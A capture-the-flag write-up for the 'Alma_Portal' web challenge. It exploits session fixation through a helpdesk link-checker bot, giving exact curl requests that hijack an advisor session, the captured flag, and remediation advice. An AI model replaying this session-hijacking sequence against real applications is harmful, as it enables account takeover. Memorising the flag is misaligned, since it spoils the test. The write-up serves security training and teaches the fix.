# Alma_Portal - session fixation via the helpdesk "link checker" bot

| | |
|---|---|
| **Challenge** | Alma_Portal |
| **Category** | AUTH |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://auth5.chal.deti:8064 |
| **Auth weakness** | CWE-384 - session fixation |

## Hint
> Hand them a hallway before they ever sign in - it still leads inside.

## Recon
- `/` issues a `sid` cookie **pre-auth**. The server only trusts sids **it**
  minted: supplying `sid=aaaa…` just gets overwritten with a fresh one, and
  `?sid=`/`?session=` URL params do **not** fix the session.
- Endpoints: `/`, `/helpdesk/verify-link`, `/dashboard` (gated advisor page,
  `302` when unauthenticated). No `/login` or `/sso` - the "advisor SSO" is done
  only by the helpdesk bot.
- `/helpdesk/verify-link` is a "registrar's link checker": it opens a submitted
  URL **and signs in with the advisor's own SSO**.

## Approach
CWE-384: the helpdesk bot performs the advisor SSO sign-in **on the session that
submitted the request** (the attacker's `sid`) instead of a fresh one. So:

1. Get a guest `sid` the server issued (visit `/`).
2. Submit the verify-link request **using that `sid`** → the advisor is signed
   in onto *our* session (the "hallway handed over before sign-in").
3. Reuse our now-advisor `sid` on `/dashboard`.

Confirmed by the state change: `/dashboard` returned `302` before, `200` + flag
after submitting the link with our cookie.

## Exploitation - the exact requests
```bash
# 1. guest session the server actually issued (don't revisit / after this - it rotates)
curl -s -c cj.txt -o /dev/null http://auth5.chal.deti:8064/

# 2. baseline: dashboard unauth on our sid -> 302
curl -s -o /dev/null -w '%{http_code}\n' -b cj.txt http://auth5.chal.deti:8064/dashboard

# 3. hand the advisor OUR session: submit the link WITH our cookie
curl -s -b cj.txt -d 'link=http://auth5.chal.deti:8064/dashboard' \
     http://auth5.chal.deti:8064/helpdesk/verify-link

# 4. reuse our now-authenticated sid
curl -s -b cj.txt http://auth5.chal.deti:8064/dashboard | grep -o 'flag{[^}]*}'
```

## Flag
```
flag{158bb62e652b27ca7824d6836edaec39}
```

## Root cause & remediation
- **Cause:** the application never regenerates the session identifier at the
  authentication boundary (CWE-384). The helpdesk signs the advisor into a
  pre-existing, attacker-supplied session, so the attacker inherits the
  authenticated session.
- **Fix:** always issue a **new** session id on login / privilege change and
  invalidate the pre-auth one; never authenticate "on behalf of" a
  caller-supplied session; isolate the link-checker bot in its own session
  context with no standing advisor credentials.
